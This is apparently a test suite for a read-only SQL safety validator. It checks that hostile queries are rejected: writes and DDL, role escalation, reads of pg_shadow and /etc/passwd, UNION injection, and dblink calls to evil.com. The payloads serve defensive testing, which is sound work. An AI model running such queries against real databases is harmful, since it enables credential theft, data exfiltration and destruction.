import { describe, expect, it } from "vitest";
import { validateQuerySafety } from "../src/sql/safety.js";

describe("Adversarial SQL safety and dialect AST allowlist", () => {
  const allowedSchemas = ["analytics_clean", "analytics_dirty"];

  describe("write CTE and data modification attempts", () => {
    it("denies CTE with DELETE statement", () => {
      const sql =
        "WITH w AS (DELETE FROM analytics_clean.schools WHERE id = 1) SELECT * FROM w";
      const result = validateQuerySafety(sql, allowedSchemas);
      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/write|non-SELECT/i);
    });

    it("denies CTE with UPDATE statement", () => {
      const sql =
        "WITH w AS (UPDATE analytics_clean.schools SET name = 'hacked' WHERE id = 1) SELECT * FROM w";
      const result = validateQuerySafety(sql, allowedSchemas);
      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/write|non-SELECT/i);
    });

    it("denies CTE with INSERT statement", () => {
      const sql =
        "WITH w AS (INSERT INTO analytics_clean.schools VALUES (99, 'bad')) SELECT * FROM w";
      const result = validateQuerySafety(sql, allowedSchemas);
      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/write|non-SELECT/i);
    });

    it("denies SELECT INTO new table creation", () => {
      const sql = "SELECT id, name INTO new_table FROM analytics_clean.schools";
      const result = validateQuerySafety(sql, allowedSchemas);
      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/SELECT INTO/i);
    });

    it("denies DDL commands directly", () => {
      const ddlQueries = [
        "DROP TABLE analytics_clean.schools",
        "ALTER TABLE analytics_clean.schools ADD COLUMN injected text",
        "TRUNCATE TABLE analytics_clean.enrolments",
        "CREATE TABLE analytics_clean.injected (id int)",
      ];
      for (const sql of ddlQueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
      }
    });
  });

  describe("transaction controls and privilege escalation", () => {
    it("denies transaction control statements", () => {
      const txQueries = [
        "BEGIN; SELECT 1;",
        "COMMIT;",
        "ROLLBACK;",
        "SAVEPOINT sp1; SELECT 1;",
      ];
      for (const sql of txQueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/disallowed|transaction|malformed/i);
      }
    });

    it("denies role and session authorization changes", () => {
      const roleQueries = [
        "SET ROLE postgres; SELECT 1;",
        "SET SESSION AUTHORIZATION postgres; SELECT 1;",
        "SET TRANSACTION READ WRITE; SELECT 1;",
        "GRANT ALL ON SCHEMA analytics_clean TO public;",
        "REVOKE SELECT ON analytics_clean.schools FROM reader;",
      ];
      for (const sql of roleQueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
      }
    });

    it("denies lock table and row locking syntax", () => {
      const lockingQueries = [
        "LOCK TABLE analytics_clean.schools IN EXCLUSIVE MODE",
        "SELECT * FROM analytics_clean.schools FOR UPDATE",
        "SELECT * FROM analytics_clean.schools FOR SHARE",
      ];
      for (const sql of lockingQueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
      }
    });
  });

  describe("system catalog, metadata and unauthorized schema access", () => {
    it("denies access to system schemas and tables", () => {
      const catalogQueries = [
        "SELECT * FROM pg_catalog.pg_user",
        "SELECT * FROM pg_catalog.pg_database",
        "SELECT * FROM pg_shadow",
        "SELECT * FROM pg_tables",
        "SELECT * FROM information_schema.tables",
        "SELECT * FROM information_schema.columns",
      ];
      for (const sql of catalogQueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/Forbidden|system/i);
      }
    });

    it("denies access to private/restricted schemas outside allowlist", () => {
      const forbiddenQueries = [
        "SELECT * FROM private_data.restricted",
        "SELECT id, value FROM private_data.restricted WHERE id = 1",
      ];
      for (const sql of forbiddenQueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/Forbidden schema/i);
      }
    });

    it("denies access via UNION injection", () => {
      const unionQueries = [
        "SELECT school_id AS id FROM analytics_clean.enrolments UNION SELECT id FROM private_data.restricted",
        "SELECT school_id AS id FROM analytics_clean.enrolments UNION ALL SELECT id FROM private_data.restricted",
        "SELECT school_id AS id FROM analytics_clean.enrolments UNION SELECT id FROM pg_catalog.pg_user",
      ];
      for (const sql of unionQueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
      }
    });

    it("denies access via subquery in WHERE, FROM, or SELECT", () => {
      const subqueries = [
        "SELECT * FROM analytics_clean.schools WHERE id IN (SELECT id FROM private_data.restricted)",
        "SELECT * FROM (SELECT * FROM private_data.restricted) AS sub",
        "SELECT id, (SELECT value FROM private_data.restricted WHERE id = 1) AS leaked FROM analytics_clean.schools",
        "SELECT s.id FROM analytics_clean.schools s JOIN private_data.restricted p ON s.id = p.id",
      ];
      for (const sql of subqueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
      }
    });
  });

  describe("dangerous and network functions", () => {
    it("denies file and OS inspection functions", () => {
      const fnQueries = [
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_read_binary_file('/etc/shadow')",
        "SELECT pg_write_file('/tmp/bad', 'data')",
        "SELECT pg_ls_dir('/var/lib')",
        "SELECT pg_stat_file('/etc/hosts')",
        "SELECT pg_sleep(5)",
        "SELECT pg_terminate_backend(123)",
        "SELECT pg_cancel_backend(123)",
      ];
      for (const sql of fnQueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/Disallowed function/i);
      }
    });

    it("denies network, dblink, and remote execution functions", () => {
      const networkQueries = [
        "SELECT dblink_connect('c', 'host=evil.com')",
        "SELECT dblink('host=evil.com', 'SELECT 1')",
        "SELECT inet_client_addr()",
        "SELECT inet_server_addr()",
      ];
      for (const sql of networkQueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/Disallowed function/i);
      }
    });

    it("denies XML exfiltration and reflection functions", () => {
      const xmlQueries = [
        "SELECT query_to_xml('SELECT * FROM private_data.restricted', true, false, '')",
        "SELECT table_to_xml('private_data.restricted', true, false, '')",
        "SELECT schema_to_xml('private_data', true, false, '')",
        "SELECT current_setting('server_version')",
        "SELECT has_table_privilege('private_data.restricted', 'select')",
      ];
      for (const sql of xmlQueries) {
        const result = validateQuerySafety(sql, allowedSchemas);
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/Disallowed function/i);
      }
    });
  });

  describe("evasion techniques and null bytes", () => {
    it("denies null byte in query", () => {
      const sql = "SELECT * FROM analytics_clean.schools\0 WHERE id = 1";
      const result = validateQuerySafety(sql, allowedSchemas);
      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/Null byte/i);
    });

    it("denies empty or whitespace-only query", () => {
      const sql = "   \n\t  ";
      const result = validateQuerySafety(sql, allowedSchemas);
      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/Empty/i);
    });

    it("denies multiple statements concatenated with comments", () => {
      const sql = "SELECT 1; /* comment */ DROP TABLE analytics_clean.schools;";
      const result = validateQuerySafety(sql, allowedSchemas);
      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/Multiple statements|Only read-only/i);
    });
  });

  describe("approved analytical constructs", () => {
    it("allows valid multi-CTE analytical queries", () => {
      const sql = `
        WITH current_period AS (
          SELECT school_id, enrolled
          FROM analytics_clean.enrolments
          WHERE year = 2025 AND enrolled IS NOT NULL
        ),
        previous_period AS (
          SELECT school_id, enrolled
          FROM analytics_clean.enrolments
          WHERE year = 2024 AND enrolled IS NOT NULL
        )
        SELECT
          c.school_id,
          c.enrolled - p.enrolled AS delta
        FROM current_period c
        INNER JOIN previous_period p ON c.school_id = p.school_id
        WHERE c.enrolled < p.enrolled
        ORDER BY c.school_id
      `;
      const result = validateQuerySafety(sql, allowedSchemas);
      expect(result.allowed).toBe(true);
      expect(result.referencedTables).toContain("analytics_clean.enrolments");
    });

    it("allows standard analytical functions", () => {
      const sql = `
        SELECT
          school_id,
          count(*) AS obs_count,
          coalesce(sum(enrolled), 0) AS total_enrolled,
          round(avg(enrolled), 2) AS avg_enrolled,
          min(enrolled) AS min_enrolled,
          max(enrolled) AS max_enrolled,
          row_number() OVER (PARTITION BY school_id ORDER BY year DESC) AS rn
        FROM analytics_clean.enrolments
        GROUP BY school_id
      `;
      const result = validateQuerySafety(sql, allowedSchemas);
      expect(result.allowed).toBe(true);
    });
  });
});
